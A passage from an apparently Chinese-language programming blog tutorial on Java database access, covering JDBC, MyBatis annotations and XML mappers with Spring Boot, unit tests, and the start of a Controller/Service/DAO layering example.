class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Mysql_Test</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mysql_Test</span>();</span><br><span class="line">        <span class="comment">//sql.delectTableName(&quot;users&quot;);</span></span><br><span class="line">        <span class="comment">//sql.CreatTable();</span></span><br><span class="line">        <span class="comment">//sql.Insert(&quot;LSE1&quot;,&quot;LSE11&quot;,&quot;LSE@qq.com&quot;);</span></span><br><span class="line">        <span class="comment">//sql.Update(&quot;LSE&quot;,&quot;222&quot;,&quot;LSE@qq.com&quot;,1);</span></span><br><span class="line">        ResultSet res= sql.SelectByName(<span class="string">&quot;LSE&quot;</span>);</span><br><span class="line">        res.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> res.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> res.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            System.out.println(name + <span class="string">&quot;\n&quot;</span> + password);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="MyBatis的使用"><a href="#MyBatis的使用" class="headerlink" title="MyBatis的使用"></a>MyBatis的使用</h1><p>MyBatis是一个基于JDBC包装简化sql查询编写的组件。<br>我们可以将上面较长的代码编写成如下一小段</p><img src="/2025/05/10/java%E5%BC%80%E5%8F%91/IMG_20250511-133708973.png" class="">  <img src="/2025/05/10/java%E5%BC%80%E5%8F%91/IMG_20250511-133720803.png" class="">  <img src="/2025/05/10/java%E5%BC%80%E5%8F%91/IMG_20250511-133743636.png" class="">  <img src="/2025/05/10/java%E5%BC%80%E5%8F%91/IMG_20250511-135330206.png" class="">  <p>我们只要编写好一个接口，写上Mapeper，Mapper<br>Scan这些注解，一个User类，和配置好连接配置，就可以调用sql查询了。</p><h2 id="编写的整体代码"><a href="#编写的整体代码" class="headerlink" title="编写的整体代码"></a>编写的整体代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MyBatis;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@Data // 生成通用方法</span></span><br><span class="line"><span class="comment">//@AllArgsConstructor // 全参构造</span></span><br><span class="line"><span class="comment">//@NoArgsConstructor // 无参构造</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;id:&quot;</span>+id+<span class="string">&quot;,username:&quot;</span>+username+<span class="string">&quot;,password:&quot;</span>+password+<span class="string">&quot;,email:&quot;</span>+email+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmail</span><span class="params">(String email)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> MyBatis.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MyBatis.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from users where id=#&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">selectAllUsers</span><span class="params">(<span class="type">int</span> id)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Application</span></span><br><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;MyBatis.Mapper&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置</span></span><br><span class="line"># MyBatis 配置</span><br><span class="line">mybatis.mapper-locations=classpath:mappers<span class="comment">/**/*.xml</span></span><br><span class="line"><span class="comment">mybatis.type-aliases-package=com.example.demo.mybatis.entity</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 服务器端口</span></span><br><span class="line"><span class="comment">server.port=8080</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 数据源配置</span></span><br><span class="line"><span class="comment">spring.datasource.url=jdbc:mysql://localhost:3306/web</span></span><br><span class="line"><span class="comment">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="comment">spring.datasource.username=root</span></span><br><span class="line"><span class="comment">spring.datasource.password=root11</span></span><br></pre></td></tr></table></figure><h3 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h3><p>在Mybatis的调用中，因为我们使用的是springboot包装的，所以我们没法再mian中调用，spring是可以再service和Controller 中调用MyBatis的，这里我直接使用单元测试类。来测试<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MyBatis.Mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> MyBatis.User;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DemoApplicationTests</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SelectAllUser</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;User&gt; list =userMapper.selectAllUsers(<span class="number">1</span>);</span><br><span class="line">        list.forEach(user -&gt; System.out.println(user));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>@Autowired是Springboot的注解作用是注入bean，其实就是注入对象。<br>我们在前面编写Mapper时使用了一个@Mapper的注解这个注解，的作用是标记这个接口。在应用程序启动时其依赖 ​MyBatis-Spring 和注解@MapperScan来生成动态代理。（@MapperScan 会扫描指定包下的接口，并为其生成代理对象。）<br>我们使用@Autowired注入的就是这个动态代理对象，即我们的<code>private UserMapper userMapper</code>的userMapper是这个动态代理对像</p><img src="/2025/05/10/java%E5%BC%80%E5%8F%91/IMG_20250511-135449453.png" class="">  <p>这个单元测试其实就是启动了springbootr</p><h2 id="id-与"><a href="#id-与" class="headerlink" title="#{id}与${}"></a><code>#&#123;id&#125;与$&#123;&#125;</code></h2><p>这个其实之前就有接触过，#是预编译而$则是直接替换</p><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>我们可以通过在配置文件中添加<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl</span><br></pre></td></tr></table></figure><br>其会使得mybatis运行的sql语句在控制台输出<br><img src="/2025/05/10/java%E5%BC%80%E5%8F%91/IMG_20250511-140649822.png" class=""><br>我们也可以从日志中看到预编译的过程</p><h2 id="增删改查-1"><a href="#增删改查-1" class="headerlink" title="增删改查"></a>增删改查</h2><p>Mybatis的增删改查和前面的查询操作差不多，就是使用注解不同</p><h3 id="insert"><a href="#insert" class="headerlink" title="@insert"></a>@insert</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MyBatis.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MyBatis.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Insert;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Param;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Insert(&quot;insert into users (username,password,email) values (#&#123;username&#125;,#&#123;password&#125;,#&#123;email&#125;)&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertUser</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span> String username,<span class="meta">@Param(&quot;password&quot;)</span> String password,<span class="meta">@Param(&quot;email&quot;)</span> String email)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MyBatis.Mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> MyBatis.User;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DemoApplicationTests</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SelectAllUser</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;User&gt; list =userMapper.selectAllUsers(<span class="number">1</span>);</span><br><span class="line">        list.forEach(user -&gt; System.out.println(user));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">InsertUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> i=userMapper.insertUser(<span class="string">&quot;ad1min&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;1admin&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;增加跳数&quot;</span>+i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在我们使用mybatis传入多个值的时候需要使用@Param(“password”)标记我们的遍历，因为MyBatis 在未使用 @Param 注解时，会将方法参数按位置命名为 arg0, arg1, arg2（JDK 8+ 未开启 -parameters 编译参数）或 param1, param2, param3。</p><p>如果没有使用@Param就会抛出xxx not found</p><h3 id="update"><a href="#update" class="headerlink" title="@update"></a>@update</h3><p>差不多<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MyBatis.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MyBatis.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from users where id=#&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">selectAllUsers</span><span class="params">(<span class="type">int</span> id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Insert(&quot;insert into users (username,password,email) values (#&#123;username&#125;,#&#123;password&#125;,#&#123;email&#125;)&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertUser</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span> String username,<span class="meta">@Param(&quot;password&quot;)</span> String password,<span class="meta">@Param(&quot;email&quot;)</span> String email)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Update(&quot;update users set username=#&#123;username&#125;,password=#&#123;password&#125; where id =#&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateUser</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span> String username,<span class="meta">@Param(&quot;password&quot;)</span> String password,<span class="meta">@Param(&quot;id&quot;)</span> <span class="type">int</span> id)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MyBatis.Mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> MyBatis.User;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DemoApplicationTests</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">UpdateUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span>userMapper.updateUser(<span class="string">&quot;lalala&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;修改&quot;</span>+i+<span class="string">&quot;条&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><p>也差不多使用@Delete来删除<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Delete(&quot;Delete from users where id =#&#123;id&#125;&quot;)</span><br><span class="line">public int deleteUser(@Param(&quot;id&quot;)int id);</span><br></pre></td></tr></table></figure></p><h2 id="xml配置"><a href="#xml配置" class="headerlink" title="xml配置"></a>xml配置</h2><p>XML配置有几个规范<br>xml放在资源文件夹里，xml下的包名和接口的包名相同，xml文件名和接口类的文件名相同<br>xml的mapper中的namespace值为mapper接口的全类名<br>xml映射文件的select语句中的id值和方法名相同，还得规定返回类型<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package MyBatis.Mapper;</span><br><span class="line"></span><br><span class="line">import MyBatis.User;</span><br><span class="line">import org.apache.ibatis.annotations.*;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">@Mapper</span><br><span class="line">public interface UserMapper &#123;</span><br><span class="line">    public List&lt;User&gt; selectAllUsers(int id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//UserMapper.xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;</span><br><span class="line">&lt;mapper namespace=&quot;MyBatis.Mapper.UserMapper&quot;&gt;</span><br><span class="line">    &lt;select id=&quot;selectAllUsers&quot; resultType=&quot;MyBatis.User&quot;&gt;</span><br><span class="line">        SELECT * FROM users where id =#&#123;id&#125;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>下面来解释一下<code>&lt;mapper namespace=&quot;MyBatis.Mapper.UserMapper&quot;&gt;</code>的意思是映射的类为namespace的值<br>而select标签其实就是注解中脑洞@Select如果是@Updat就用update标签<br>id就是方法名，resultType就是返回类型<br><img src="/2025/05/10/java%E5%BC%80%E5%8F%91/IMG_20250511-152751079.png" class="">  </p><h1 id="三层架构，ioc，di"><a href="#三层架构，ioc，di" class="headerlink" title="三层架构，ioc，di"></a>三层架构，ioc，di</h1><p>首先简单说一下三层架构吧</p><h2 id="简介三层架构"><a href="#简介三层架构" class="headerlink" title="简介三层架构"></a>简介三层架构</h2><p>三层架构也就是Contorller,Service,dao，分别是控制器，业务逻辑层，数据处理层。将我们的代码分为这三层可以很好的对我们的项目进行维护。</p><h2 id="高耦合低内聚"><a href="#高耦合低内聚" class="headerlink" title="高耦合低内聚"></a>高耦合低内聚</h2><p>耦合性也就是不同层之间的关系，而内聚就是层内代码的关联度，而不同层中要尽量低耦合这样在不同层修改时可以做到层与层之间影响最小</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>我们来看下面这个三层结构的代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.LSE.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.LSE.Service.UserService;</span><br><span class="line"><span class="keyword">import</span> com.LSE.dto.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> UserService userService;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/Users&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">Users</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;User&gt; list = userService.findAll();</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span 